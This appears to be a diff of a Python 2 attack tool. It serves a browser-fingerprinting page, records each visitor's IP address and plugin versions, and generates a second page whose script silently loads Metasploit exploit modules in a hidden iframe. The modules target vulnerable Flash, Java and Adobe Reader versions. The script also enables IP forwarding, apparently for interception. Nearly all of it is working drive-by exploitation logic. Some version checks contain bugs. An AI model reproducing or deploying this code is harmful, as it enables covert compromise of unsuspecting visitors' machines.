@@ -6,12 +6,31 @@ from os import curdir, sep
 import sys
 
 javaSelfsigned=False
-runExploit=True
+
+runFlash=True
+runJava=True
+runReader=True
 msfPath="/pentest/metasploit-framework"
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         if 'fingerprint.html' in self.path:
+                f = open(curdir + sep + self.path, 'rb')
+		self.send_response(200)
+                self.send_header('Content-type',    'text/html')
+                self.end_headers()
+                self.wfile.write(f.read())
+                f.close()
+                return		
+        if 'fingerprint_exploit.html' in self.path:
+                f = open(curdir + sep + self.path, 'rb')
+		self.send_response(200)
+                self.send_header('Content-type',    'text/html')
+                self.end_headers()
+                self.wfile.write(f.read())
+                f.close()
+                return		
+        if 'jquery.min.js' in self.path:
                 f = open(curdir + sep + self.path, 'rb')
 		self.send_response(200)
                 self.send_header('Content-type',    'text/html')
@@ -32,16 +51,18 @@ class Handler(BaseHTTPRequestHandler):
             message = '\r\n'.join(message_parts)
             self.send_response(200)
             self.end_headers()
+
             for msg in message_parts:
-                if 'client_address' in msg:
-                    print "Target: "+msg.split(") (")[1].strip(")")
-                if 'query' in msg:
-                    pluginVer = msg.replace("query=","").split('&')
-		    for i in pluginVer:
-			if i:
-				pdtName,pdtVer = i.split("=")
-				pdtVer = pdtVer.replace(",",".")
-				print pdtName+'\t'+pdtVer
+		if "query=" in msg and "&" in msg:
+			for msg1 in message_parts:
+		             if 'client_address' in msg1:
+       		             	print "Target: "+msg1.split(") (")[1].strip(")")
+                   	pluginVer = msg.replace("query=","").split('&')
+		    	for i in pluginVer:
+				if i:
+					pdtName,pdtVer = i.split("=")
+					pdtVer = pdtVer.replace(",",".")
+					print pdtName+'\t'+pdtVer
             return
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -62,6 +83,7 @@ def getIP(iface):
 
 def modifyHTML(filename):
     content = []
+    contentExploit = []
     
     ipAddr = getIP('eth0')
     with open(filename) as f:
@@ -69,132 +91,151 @@ def modifyHTML(filename):
 		if '$.get(' in line:
 			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params, function(data) {\n"
 			content.append(replaceLine)
+			contentExploit.append(replaceLine)
+		elif 'iframe id="signed"' in line:
+			replaceLine = '<iframe id="signed" src="http://'+ipAddr+':9090/blank.html"'
+			content.append(replaceLine)
+			contentExploit.append(replaceLine)
+		elif 'iframe id="exploit"' in line:
+			replaceLine = '<iframe id="exploit" src="http://'+ipAddr+':9090/blank.html"'
+			content.append(replaceLine)
+			contentExploit.append(replaceLine)
 		elif line.strip()=="//plugins":
-			if runExploit==True:
-				content.append(line)
+				content.append(line)	
 				content.append("var iframe = document.getElementById('exploit');\n")
-				content.append("var iframesigned = document.getElementById('signed');\n")
+				content.append("url = 'http://"+ipAddr+":9090/fingerprint_exploit.html';\n")
+				content.append("iframe.setAttribute('src',url);\n")
+				#content.append("iframe.contentDocument.location.reload(true);\n")
+			
+				contentExploit.append(line)
+				contentExploit.append("var iframe = document.getElementById('exploit');\n")
+				contentExploit.append("var iframesigned = document.getElementById('signed');\n")
+				contentExploit.append("verSplit=BrowserScanHostDetails[ao[i]].split(',');\n")
+				contentExploit.append("verFull=BrowserScanHostDetails[ao[i]];\n")
 
-				content.append("plugin=plugins[ao[i]];\n")
-				content.append("verSplit=BrowserScanHostDetails[ao[i]].split(',');\n")
-				content.append("verFull=BrowserScanHostDetails[ao[i]];\n")
-				content.append("verMaj = verSplit[0]+','+verSplit[1]+','+verSplit[2];\n")
-				content.append("verFullJoin = verSplit[0]+verSplit[1]+verSplit[2]+verSplit[3];\n")
-				content.append("verMaj1 = verSplit[0];\n")
-				content.append("verMaj12 = verSplit[0]+','+verSplit[1];\n")
-				content.append("verMaj12Join = verSplit[0]+verSplit[1];\n")
-				content.append("verMaj2 = verSplit[1];\n")
-				content.append("verMin = verSplit[3];\n")
-				#content.append("if(plugin=='java'){alert(verMaj+'\t'+verMin);}\n")
-				#content.append("alert(verMaj);\n")
-				#content.append("alert(verMin);\n")
+				contentExploit.append("verMaj = verSplit[0]+','+verSplit[1]+','+verSplit[2];\n")
+				contentExploit.append("verFullJoin = verSplit[0]+verSplit[1]+verSplit[2]+verSplit[3];\n")
+				contentExploit.append("verMaj1 = verSplit[0];\n")
+				contentExploit.append("verMaj12 = verSplit[0]+','+verSplit[1];\n")
+				contentExploit.append("verMaj12Join = verSplit[0]+verSplit[1];\n")
+				contentExploit.append("verMaj2 = verSplit[1];\n")
+				contentExploit.append("verMin = verSplit[3];\n")
+				contentExploit.append("var plugin = plugins[ao[i]];\n")
+
+				#Adobe Flash
+				if runFlash==True:
+					contentExploit.append("url = 'http://"+ipAddr+":8094/adobe_flash_avm2';\n")
+					contentExploit.append("if(plugin=='flash' && verFull=='11,7,700,202' || verFull=='11.3.372.94'){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}\n")
+	
+					contentExploit.append("url = 'http://"+ipAddr+":8095/adobe_flash_filters_type_confusion';\n")
+					contentExploit.append("if(plugin=='flash' && (verMaj12=='11,7' || verMaj12=='11,8' || (verMaj12=='11,9' && verMaj3<=900))){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8096/adobe_flash_mp4_cprt';\n")	
+					contentExploit.append("if(plugin=='flash' && (verFull=='10,3,183,15' || verMaj12=='11,0' || verMaj12=='11,1')){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8097/e1';\n")
+					contentExploit.append("if(plugin=='flash' && (verFull=='11,2,202,233' || verFull=='11,3,300,268' || verFull=='11,3,300,265' || verFull=='11,3,300,257')){iframe.setAttribute('src',url);}\n")
+			
+					contentExploit.append("url = 'http://"+ipAddr+":8098/adobe_flash_pixel_bender_bof';\n")
+					contentExploit.append("if((verMaj1>='11' && verMaj2<=12) || (verMaj1=='13' && verMaj2=='0' && verMaj3=='0' && verMaj4<=182)){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8099/adobe_flash_regex_value';\n")
+					contentExploit.append("if(plugin=='flash' && (verMaj12=='11,5' && verFullJoin<'11.5.502.149')){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8100/adobe_flash_rtmp';\n")
+					contentExploit.append("if(plugin=='flash' && verFull=='11,2,202,228'){iframe.setAttribute('src',url);}\n")
+			
+					contentExploit.append("url = 'http://"+ipAddr+":8101/adobe_flash_sps';\n")
+					contentExploit.append("if(plugin=='flash' && verMaj1=='10'){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8102/adobe_flashplayer_arrayindexing';\n")
+					contentExploit.append("if(plugin=='flash' && (verMaj1<10) || (verMaj1=='10' && verMaj2<=3) || (verFull=='10,3,185,23' || verFull=='10,3,185,21'|| verFull=='10,3,181,23' || verFull=='10,3,181,16' || verFull=='10,3,181,14' || verFull=='10,3,185,21' || verFull=='10,3,185,23')){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8103/adobe_flashplayer_avm';\n")
+					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2)) || (verFull=='10,2,154,13' || verFull=='10,2,152,33'|| verFull=='10,2,152,32' || verFull=='10,2,152,0')){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8105/adobe_flashplayer_newfunction';\n")
+					contentExploit.append("if(plugin=='flash' && ((verMaj12=='9,0' || (verMaj12=='9,3' && verMaj3=='2') || verFull=='10,0,45,2' || verFull=='10,0,42,34' || verFull=='10,0,32,18' || verFull=='10,0,22,,87' || verFull=='10,0,15,3' || verFull=='10,0,12,36' || verFull=='10,0,12,10' || verFull=='10.0.0.584'))){iframe.setAttribute('src',url);}\n")
+
+					contentExploit.append("url = 'http://"+ipAddr+":8104/adobe_flashplayer_flash10o';\n")
+					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2) || (verFull=='10,2,156,12'||verFull=='10,2,154,25' 				||verFull=='10,2,154,13'||verFull=='10,2,152,33'				|| verFull=='10,2,152,32' || verFull=='10,2,152,0' ))) {iframe.setAttribute('src',url);}\n")
 
 				#Java
-				content.append("url = 'http://172.16.91.187:8085/java_jre17_reflection_types';\n")
-				content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+				if runJava==True:
+					contentExploit.append("url = 'http://172.16.91.187:8085/java_jre17_reflection_types';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8084/java_jre17_provider_skeleton';\n")
-				content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>-1 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8084/java_jre17_provider_skeleton';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>-1 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8082/java_jre17_jmxbean_2';\n")
-				content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8082/java_jre17_jmxbean_2';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8086/java_rhino';\n")
-				content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8086/java_rhino';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8083/java_jre17_method_handle';\n")
-				content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<8){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>3 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8083/java_jre17_method_handle';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<8){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>3 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8092/java_verifier_field_access';\n")
-				content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin==32){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin==4){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin==35){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8092/java_verifier_field_access';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin==32){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin==4){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin==35){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8091/java_trusted_chain';\n")
-				content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<24){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,4,2'){if(verMin>0 && verMin<10){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8091/java_trusted_chain';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<24){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,4,2'){if(verMin>0 && verMin<10){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8090/java_storeimagearray';\n")
-				content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>35 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>21 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8090/java_storeimagearray';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>35 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>21 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+	
+					contentExploit.append("url = 'http://172.16.91.187:8088/java_setdifficm_bof';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<17){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,4,0'){if(verMin>0 && verMin<25){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+				
+					contentExploit.append("url = 'http://172.16.91.187:8087/java_rmi_connection_impl';\n")
+					contentExploit.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>-1 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.187:8088/java_setdifficm_bof';\n")
-				content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<17){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				content.append("if(plugin=='java' && verMaj=='1,4,0'){if(verMin>0 && verMin<25){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			
-				content.append("url = 'http://172.16.91.187:8087/java_rmi_connection_impl';\n")
-				content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>-1 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				#If all else fails, let's use the java signed applet
-				if(javaSelfsigned==True):	
-					content.append("url = 'http://172.16.91.187:8089/java_signed_applet';\n")
-					content.append("if(plugin=='java'){{iframesigned.setAttribute('src',url);iframesigned.contentDocument.location.reload(true);}};\n")	
+					#If all else fails, let's use the java signed applet
+					if(javaSelfsigned==True):	
+						contentExploit.append("url = 'http://172.16.91.187:8089/java_signed_applet';\n")
+						contentExploit.append("if(plugin=='java'){{iframesigned.setAttribute('src',url);iframesigned.contentDocument.location.reload(true);}};\n")	
 
 				#Adobe Reader			
-				content.append("url = 'http://172.16.91.187:8093/adobe_cooltype_sing';\n")
-				content.append("if(plugin=='reader' && ((verMaj1=='9' && VerMaj2=='3') || verMaj=='9,3,4')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.187:8106/adobe_flatedecode_predictor02';\n")
-				content.append("if(plugin=='reader' && verMaj=='9,1,0'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.187:8107/adobe_geticon';\n")
-				content.append("if(plugin=='reader' && (verMaj=='8,0,0' || verMaj=='8,1,2' || verMaj=='9,0,0')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				
-				content.append("url = 'http://172.16.91.187:8108/adobe_media_newplayer';\n")
-				content.append("if(plugin=='reader' && (verMaj=='8,1,1' || verMaj=='9,1,0' || (verMaj1=='9' && verMaj2=='2')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.187:8109/adobe_toolbutton';\n")
-				content.append("if(plugin=='reader' && (verMaj=='11,0,2' || verMaj=='10,0,4')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.187:8110/adobe_utilprintf';\n")
-				content.append("if(plugin=='reader' && verMaj=='8,1,2'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-				
-				#Adobe Flash
-				content.append("url = 'http://172.16.91.187:8094/adobe_flash_avm2';\n")
-				content.append("if(plugin=='flash' && (verFull=='11,7,700,202' || verFull=='11.3.372.94'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.87:8095/adobe_flash_filters_type_confusion';\n")	
-				content.append("if(plugin=='flash' && (verMaj12=='11,7' || verMaj12=='11,8' || (verMaj12=='11,9' && verMaj3<='900')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.87:8096/adobe_flash_mp4_cprt';\n")
-				content.append("if(plugin=='flash' && (verFull=='10,3,183,15' || verMaj12=='11,0' || verMaj12=='11,1'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.87:8097/adobe_flash_otf_font';\n")
-				content.append("if(plugin=='flash' && (verFull=='11,2,202,233' || verFull=='11,3,300,268' || verFull=='11,3,300,265' || verFull=='11,3,300,257')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+				if runReader==True:
+					contentExploit.append("url = 'http://172.16.91.187:8093/adobe_cooltype_sing';\n")
+					contentExploit.append("if(plugin=='reader' && ((verMaj1=='9' && verMaj2=='3') || verMaj=='9,3,4')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 			
-				content.append("url = 'http://172.16.91.87:8098/adobe_flash_pixel_bender_bof';\n")
-				content.append("if((verMaj1>='11' && verMaj2<='12') || (verMaj1=='13' && verMaj2=='0' && verMaj3=='0' && verMaj4<='182')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8106/adobe_flatedecode_predictor02';\n")
+					contentExploit.append("if(plugin=='reader' && verMaj=='9,1,0'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.87:8099/adobe_flash_regex_value';\n")
-				content.append("if(plugin=='flash' && (verMaj12=='11,5' && verFullJoin<'11.5.502.149')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8107/adobe_geticon';\n")
+					contentExploit.append("if(plugin=='reader' && (verMaj=='8,0,0' || verMaj=='8,1,2' || verMaj=='9,0,0')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 				
-				content.append("url = 'http://172.16.91.87:8100/adobe_flash_rtmp';\n")
-				content.append("if(plugin=='flash' && (verFull=='11,2,202,228')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-			
-				content.append("url = 'http://172.16.91.87:8101/adobe_flash_sps';\n")
-				content.append("if(plugin=='flash' && verMaj1=='10'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8109/adobe_media_newplayer';\n")
+					contentExploit.append("if(plugin=='reader' && (verMaj=='8,1,1' || verMaj=='9,1,0' || (verMaj1=='9' && verMaj2=='2'))){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.87:8102/adobe_flashplayer_arrayindexing';\n")
-				content.append("if(plugin=='flash' && ((verMaj1<'10') || (verMaj1=='10' && verMaj2<='3') || (verFull=='10,3,185,23' || verFull=='10,3,185,21'|| verFull=='10,3,181,23' || verFull=='10,3,181,16' || verFull=='10,3,181,14' || verFull=='10,3,185,21' || verFull=='10,3,185,23')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8110/adobe_toolbutton';\n")
+					contentExploit.append("if(plugin=='reader' && (verMaj=='11,0,2' || verMaj=='10,0,4')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.87:8103/adobe_flashplayer_avm';\n")
-				content.append("if(plugin=='flash' && ((verMaj1>='9') || (verMaj1<'10') || (verMaj1=='10' && verMaj2<='2') || (verFull=='10,2,154,13' || verFull=='10,2,152,33'|| verFull=='10,2,152,32' || verFull=='10,2,152,0')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
+					contentExploit.append("url = 'http://172.16.91.187:8111/adobe_utilprintf';\n")
+					contentExploit.append("if(plugin=='reader' && verMaj=='8,1,2'){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
-				content.append("url = 'http://172.16.91.87:8104/adobe_flashplayer_flash10o';\n")
-				content.append("if(plugin=='flash' && ((verMaj1>='9') || (verMaj1<'10') || (verMaj1=='10' && verMaj2<='2') || (verFull=='10,2,156,12' || verFull=='10,2,154,25'|| verFull=='10,2,154,13' || verFull=='10,2,152,33' || verFull=='10,2,152,32' || verFull='10,2,152,0')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
-
-				content.append("url = 'http://172.16.91.87:8105/adobe_flashplayer_newfunction';\n")
-				content.append("if(plugin=='flash' && (verMaj12=='9,0')||(verMaj12=='9,3' && verMajr3<='2')||(verFull=='10,0,45,2' || verFull=='10,0,42,34' || verFull=='10,0,32,18' || verFull=='10,0,22,,87' || verFull=='10,0,15,3' || verFull=='10,0,12,36' || verFull=='10,0,12,10' || verFull=='10.0.0.584')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 		else:
 			content.append(line)
+			contentExploit.append(line)
     fo = open("fingerprint.html", "w+") 
     fo.writelines(content)
     fo.close()
+    fo1 = open("fingerprint_exploit.html", "w+") 
+    fo1.writelines(contentExploit)
+    fo1.close()
 def setupForwarding():
 	print "[*] Setup forwarding"
 	cmd = "sysctl -w net.ipv4.ip_forward=1"
